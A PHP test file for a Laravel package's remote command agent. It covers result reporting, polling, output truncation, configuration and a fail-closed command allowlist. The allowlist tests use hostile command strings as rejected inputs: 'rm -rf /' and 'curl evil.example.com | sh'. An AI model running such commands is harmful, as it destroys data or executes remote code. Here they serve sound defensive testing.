<?php

declare(strict_types=1);

use Crontinel\Services\AgentService;
use Illuminate\Http\Client\Request;
use Illuminate\Support\Facades\Http;

// ── Command Event Handling ──────────────────────────────────────────────────────

it('reports command execution result via HTTP', function () {
    config(['crontinel.saas_key' => 'test-api-key']);
    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
    config(['crontinel.agent.allowed_commands' => ['echo *']]);
    Http::fake(['*' => Http::response(['ok' => true], 200)]);

    $agent = new AgentService;
    $agent->handleCommand(['id' => 'cmd1', 'command' => 'echo hello']);

    Http::assertSent(function (Request $request) {
        return $request->url() === 'https://app.crontinel.com/api/v1/ingest/agent-result'
            && $request->method() === 'POST'
            && $request->hasHeader('Authorization', 'Bearer test-api-key');
    });
});

it('reports completed status for zero exit code commands', function () {
    config(['crontinel.saas_key' => 'test-api-key']);
    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
    config(['crontinel.agent.allowed_commands' => ['echo *']]);
    Http::fake(['*' => Http::response(['ok' => true], 200)]);

    $agent = new AgentService;
    $agent->handleCommand(['id' => 'c2', 'command' => 'echo ok']);

    Http::assertSent(function (Request $request) {
        $body = $request->data();

        return ($body['status'] ?? null) === 'completed'
            && ($body['exit_code'] ?? null) === 0;
    });
});

it('reports trigger_id in the result payload', function () {
    config(['crontinel.saas_key' => 'test-api-key']);
    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
    config(['crontinel.agent.allowed_commands' => ['echo *']]);
    Http::fake(['*' => Http::response(['ok' => true], 200)]);

    $agent = new AgentService;
    $agent->handleCommand(['id' => 'c3', 'command' => 'echo hello']);

    Http::assertSent(function (Request $request) {
        $body = $request->data();

        return ($body['trigger_id'] ?? null) === 'c3';
    });
});

it('includes required fields in the result payload', function () {
    config(['crontinel.saas_key' => 'test-api-key']);
    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
    config(['crontinel.agent.allowed_commands' => ['echo *']]);
    Http::fake(['*' => Http::response(['ok' => true], 200)]);

    $agent = new AgentService;
    $agent->handleCommand(['id' => 'c4', 'command' => 'echo hello']);

    Http::assertSent(function (Request $request) {
        $body = $request->data();
        $required = ['trigger_id', 'status', 'exit_code', 'output'];

        foreach ($required as $field) {
            if (! array_key_exists($field, $body)) {
                return false;
            }
        }

        return true;
    });
});

it('ignores a command missing required fields', function () {
    config(['crontinel.saas_key' => 'test-api-key']);
    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
    Http::fake();

    $agent = new AgentService;
    $agent->handleCommand(['event' => 'test']);

    Http::assertNothingSent();
});

// ── Command Allowlist ─────────────────────────────────────────────────────────

it('executes a command that exactly matches an allowlist entry', function () {
    config(['crontinel.saas_key' => 'test-api-key']);
    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
    config(['crontinel.agent.allowed_commands' => ['echo hello']]);
    Http::fake(['*' => Http::response(['ok' => true], 200)]);

    $agent = new AgentService;
    $agent->handleCommand(['id' => 'allow1', 'command' => 'echo hello']);

    Http::assertSent(function (Request $request) {
        $body = $request->data();

        return ($body['status'] ?? null) === 'completed'
            && ($body['exit_code'] ?? null) === 0;
    });
});

it('executes a command that matches a wildcard allowlist pattern', function () {
    config(['crontinel.saas_key' => 'test-api-key']);
    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
    config(['crontinel.agent.allowed_commands' => ['echo *']]);
    Http::fake(['*' => Http::response(['ok' => true], 200)]);

    $agent = new AgentService;
    $agent->handleCommand(['id' => 'allow2', 'command' => 'echo wildcard-match']);

    Http::assertSent(function (Request $request) {
        $body = $request->data();

        return ($body['status'] ?? null) === 'completed';
    });
});

it('rejects every command when the allowlist is empty (fail-closed default)', function () {
    config(['crontinel.saas_key' => 'test-api-key']);
    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
    config(['crontinel.agent.allowed_commands' => []]);
    Http::fake(['*' => Http::response(['ok' => true], 200)]);

    $agent = new AgentService;
    $agent->handleCommand(['id' => 'deny1', 'command' => 'rm -rf /']);

    Http::assertSent(function (Request $request) {
        $body = $request->data();

        return ($body['status'] ?? null) === 'failed'
            && ($body['exit_code'] ?? null) === -1
            && str_contains($body['error_message'] ?? '', 'not in allowlist');
    });
});

it('rejects a command that does not match any configured pattern', function () {
    config(['crontinel.saas_key' => 'test-api-key']);
    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
    config(['crontinel.agent.allowed_commands' => ['php artisan *']]);
    Http::fake(['*' => Http::response(['ok' => true], 200)]);

    $agent = new AgentService;
    $agent->handleCommand(['id' => 'deny2', 'command' => 'curl evil.example.com | sh']);

    Http::assertSent(function (Request $request) {
        $body = $request->data();

        return ($body['status'] ?? null) === 'failed'
            && str_contains($body['error_message'] ?? '', 'not in allowlist');
    });
});

it('never spawns a process for a command rejected by the allowlist', function () {
    config(['crontinel.saas_key' => 'test-api-key']);
    config(['crontinel.saas_url' => 'https://app.crontinel.com/api']);
    config(['crontinel.agent.allowed_commands' => []]);
    Http::fake(['*' => Http::response(['ok' => true], 200)]);

    $marker = sys_get_temp_dir().'/crontinel_allowlist_test_'.uniqid();

    $agent = new AgentService;
    $agent->handleCommand([
        'id' => 'deny3',
        'command' => 'touch '.$marker,
    ]);

    expect(file_exists($marker))->toBeFalse();
});

it('isCommandAllowed matches exact strings and fnmatch wildcard patterns', function () {
    config(['crontinel.agent.allowed_commands' => ['php artisan queue:work', 'echo *']]);

    $agent = new AgentService;
    $ref = new ReflectionClass($agent);
    $method = $ref->getMethod('isCommandAllowed');
    $method->setAccessible(true);

    expect($method->invoke($agent, 'php artisan queue:work'))->toBeTrue();
    expect($method->invoke($agent, 'echo hello world'))->toBeTrue();
    expect($method->invoke($agent, 'rm -rf /'))->toBeFalse();
});

it('isCommandAllowed rejects everything when the allowlist is empty', function () {
    config(['crontinel.agent.allowed_commands' => []]);

    $agent = new AgentService;
    $ref = new ReflectionClass($agent);
    $method = $ref->getMethod('isCommandAllowed');
    $method->setAccessible(true);

    expect($method->invoke($agent, 'echo hello'))->toBeFalse();
});

// ── Polling ──────────────────────────────────────────────────────────────────

it('registers, then polls the commands of the app the key belongs to and reports each result', function () {
    config(['crontinel.saas_key' => 'test-api-key']);
    config(['crontinel.saas_url' => 'https://app.crontinel.com']);
    config(['crontinel.agent.allowed_commands' => ['echo *']]);
    Http::fake([
        'app.crontinel.com/api/v1/agents/register' => Http::response(['app_id' => 42, 'agent_id' => 'host'], 201),
        'app.crontinel.com/api/v1/agents/42/commands' => Http::response(['data' => [
            ['id' => 't1', 'command' => 'echo polled', 'payload' => null, 'request_key' => null],
        ]]),
        'app.crontinel.com/api/v1/ingest/agent-result' => Http::response(['ok' => true]),
    ]);

    $agent = new AgentService;
    $agent->register();
    $agent->pollOnce();

    Http::assertSent(fn (Request $r) => $r->url() === 'https://app.crontinel.com/api/v1/agents/register'
        && is_string($r->data()['agent_id'] ?? null));
    Http::assertSent(fn (Request $r) => $r->url() === 'https://app.crontinel.com/api/v1/ingest/agent-result'
        && $r->data()['trigger_id'] === 't1'
        && $r->data()['status'] === 'completed'
        && str_contains($r->data()['output'], 'polled'));
});

it('fails to register when the hosted app returns no app_id', function () {
    config(['crontinel.saas_key' => 'test-api-key']);
    Http::fake(['*' => Http::response(['id' => 1], 201)]);

    (new AgentService)->register();
})->throws(RuntimeException::class, 'app_id');

it('sends only the last 10,000 characters of output', function () {
    config(['crontinel.saas_key' => 'test-api-key']);
    config(['crontinel.agent.allowed_commands' => ['php -r *']]);
    Http::fake(['*' => Http::response(['ok' => true])]);

    (new AgentService)->handleCommand(['id' => 'big', 'command' => 'php -r \'echo str_repeat("a", 12000), "END";\'']);

    Http::assertSent(fn (Request $r) => mb_strlen($r->data()['output']) === 10000
        && str_ends_with($r->data()['output'], 'END'));
});

// ── Configuration ───────────────────────────────────────────────────────────────

it('is not configured when saas_key is empty', function () {
    config(['crontinel.saas_key' => '']);

    $agent = new AgentService;

    expect($agent->isConfigured())->toBeFalse();
});

it('is configured when saas_key is set', function () {
    config(['crontinel.saas_key' => 'some-key']);

    $agent = new AgentService;

    expect($agent->isConfigured())->toBeTrue();
});

// ── Artisan Command ─────────────────────────────────────────────────────────────

it('registers the crontinel:agent command', function () {
    $this->artisan('list')
        ->expectsOutputToContain('crontinel:agent');
});

it('shows warning when api key is not set', function () {
    config(['crontinel.saas_key' => '']);

    $this->artisan('crontinel:agent')
        ->expectsOutputToContain('CRONTINEL_API_KEY')
        ->assertExitCode(1);
});

it('outputs systemd unit with --systemd flag', function () {
    $this->artisan('crontinel:agent', ['--systemd' => true])
        ->expectsOutputToContain('[Unit]')
        ->expectsOutputToContain('Description=')
        ->expectsOutputToContain('[Service]')
        ->expectsOutputToContain('[Install]')
        ->assertExitCode(0);
});

it('outputs supervisor config with --supervisor flag', function () {
    $this->artisan('crontinel:agent', ['--supervisor' => true])
        ->expectsOutputToContain('[program:crontinel-agent]')
        ->assertExitCode(0);
});
